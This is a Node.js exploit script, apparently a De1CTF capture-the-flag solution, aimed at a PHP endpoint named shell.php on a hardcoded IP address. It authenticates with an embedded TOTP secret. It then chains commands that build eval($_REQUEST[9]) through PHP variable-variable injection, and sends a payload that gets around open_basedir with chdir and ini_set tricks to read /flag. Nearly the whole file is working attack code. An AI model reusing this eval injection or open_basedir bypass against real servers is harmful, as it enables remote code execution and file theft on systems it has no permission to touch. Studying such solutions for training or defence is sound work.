const TOTP = require('totp.js');
/**
 * yarn add totp.js
 */
const http = require('http');
const querystring = require('querystring');

const totp = new TOTP("GAXG24JTMZXGKZBU", 8);

function fuck(param, method = 'GET', postData = {}) {
    let promise = new Promise(function(resolve, rejecte) {
        data = {
            a: param,
            totp: totp.genOTP(5)
        }
        var content = querystring.stringify(data);
        var options = {
            hostname: '222.85.25.41',
            port: 8090,
            path: '/shell.php?' + content,
            method: method,
            headers: {
                "Cookie": ["PHPSESSID=vk666"]
            }
        };
        if (method == 'POST') {
            postData = querystring.stringify(postData);
            options['headers']['Content-Type'] = 'application/x-www-form-urlencoded';
            options['headers']['Content-Length'] = Buffer.byteLength(postData);
        }
        var req = http.request(options, (res) => {
            res.setEncoding('utf8');
            let rawData = '';
            res.on('data', (chunk) => {
                rawData += chunk;
            });
            res.on('end', () => {
                var f = /de1ctf\{.*?\}/.exec(rawData)
                if (f) {
                    console.log(`[+] Flag is : ${f[0]}`)
                }
                resolve(1)
            });
        });
        req.on('error', function(e) {
            console.log('problem with request: ' + e.message);
            rejecte(e.message)
        });
        if (method == 'POST')
            req.write(postData);
        req.end();
    })
    return promise;
}

async function cmd(cmd, param = "") {
    console.log(`[+] => targeting ${cmd}`)
    await fuck(cmd, 'POST', param);
}


(async () => {
    console.log("[+] Waiting...")
    /* 登录 */
    await fuck(`login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`)
    /* 清除 */
    await cmd('destruct')
    // open_basedir
    await cmd('targeting i _REQUEST')
    await cmd('targeting o {${$i}{9}}') // $_REQUEST[9]
    await cmd('targeting w ${eval($o)}') // eval($_REQUEST[9])
    await cmd('launch', {
        '9': 'chdir("js");\
                ini_set("open_basedir","..");\
                chdir("..");\
                chdir("..");\
                chdir("..");\
                ini_set("open_basedir","/");\
                readfile("/flag");'
    })
})()